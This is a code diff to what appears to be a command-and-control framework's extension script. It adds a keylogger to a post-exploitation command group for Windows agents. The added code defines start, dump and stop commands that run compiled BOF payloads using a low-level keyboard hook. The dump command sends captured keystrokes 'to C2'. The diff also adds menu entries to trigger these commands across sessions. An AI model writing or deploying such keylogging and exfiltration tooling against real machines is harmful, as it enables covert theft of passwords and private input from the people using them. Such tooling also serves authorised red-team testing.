@@ -28,10 +28,6 @@ cmd_fw.addSubCommands([_cmd_fw_add]);
 
 
 
-
-
-
-
 var cmd_screenshot = ax.create_command("screenshot_bof", "Alternative screenshot capability that does not do fork n run by @codex_tf2", "screenshot -n screen1 -p 812");
 cmd_screenshot.addArgFlagString("-n", "note", "Screenshot caption", "ScreenshotBOF");
 cmd_screenshot.addArgFlagInt("-p", "pid", "PID of the application whose window screenshot will be taken. If 0, then a full-screen screenshot", 0);
@@ -44,6 +40,33 @@ cmd_screenshot.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Screenshot BOF");
 });
+
+
+
+var cmd_keylog_start = ax.create_command("start", "Start async keylogger (WH_KEYBOARD_LL). Captures keystrokes with window context and timestamps. Use keylog_dump to retrieve. [NOISE: medium]", "keylog_start\nkeylog_start 256");
+cmd_keylog_start.addArgInt("buffer_kb", false, "Buffer size in KB (default: 64, max: 4096)")
+cmd_keylog_start.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    var buf_kb   = parsed_json["buffer_kb"] || 64;
+    var bof_path = ax.script_dir() + "_bin/keylog_start_bof." + ax.arch(id) + ".o";
+    var bof_params = ax.bof_pack("int", [buf_kb]);
+
+    ax.execute_alias(id, cmdline, `execute bof -a ${bof_path} ${bof_params}`, "Task: Keylogger start (" + buf_kb + "KB buffer)", null);
+});
+
+var cmd_keylog_dump = ax.create_command("dump", "Flush current keylogger buffer to C2 and reset it. Does not stop the keylogger. [NOISE: none]", "keylog_dump");
+cmd_keylog_dump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    var bof_path = ax.script_dir() + "_bin/keylog_dump_bof." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "Task: Keylogger dump", null);
+});
+
+var cmd_keylog_stop = ax.create_command("stop", "Stop keylogger, perform final buffer dump and clean up shared memory objects. [NOISE: none]", "keylog_stop");
+cmd_keylog_stop.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    var bof_path = ax.script_dir() + "_bin/keylog_stop_bof." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "Task: Keylogger stop", null);
+});
+
+var cmd_keylog = ax.create_command("keylog", "Keylogger manager");
+cmd_keylog.addSubCommands([cmd_keylog_start, cmd_keylog_dump, cmd_keylog_stop]);
 
 
 
@@ -87,7 +110,7 @@ cmd_sauroneye.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var b_group_test = ax.create_commands_group("PostEx-BOF", [cmd_fw, cmd_screenshot, cmd_sauroneye]);
+var b_group_test = ax.create_commands_group("PostEx-BOF", [cmd_fw, cmd_keylog, cmd_screenshot, cmd_sauroneye]);
 ax.register_commands_group(b_group_test, ["beacon", "gopher", "kharon"], ["windows"], []);
 
 /// MENU
@@ -96,3 +119,12 @@ let screen_access_action = menu.create_action("Screenshot", function(agents_id) 
 menu.add_session_access(screen_access_action, ["beacon"]);
 let g_screen_access_action = menu.create_action("Screenshot", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "screenshot")) });
 menu.add_session_access(g_screen_access_action, ["gopher"]);
+
+let keylog_start_action = menu.create_action("Start", function(value) { value.forEach(v => ax.execute_command(v, "keylog start")) });
+let keylog_dump_action  = menu.create_action("Dump",  function(value) { value.forEach(v => ax.execute_command(v, "keylog dump")) });
+let keylog_stop_action  = menu.create_action("Stop",  function(value) { value.forEach(v => ax.execute_command(v, "keylog stop")) });
+let keylog_menu = menu.create_menu("Keylogger");
+keylog_menu.addItem(keylog_start_action)
+keylog_menu.addItem(keylog_dump_action)
+keylog_menu.addItem(keylog_stop_action)
+menu.add_session_access(keylog_menu, ["beacon", "gopher"], ["windows"]);
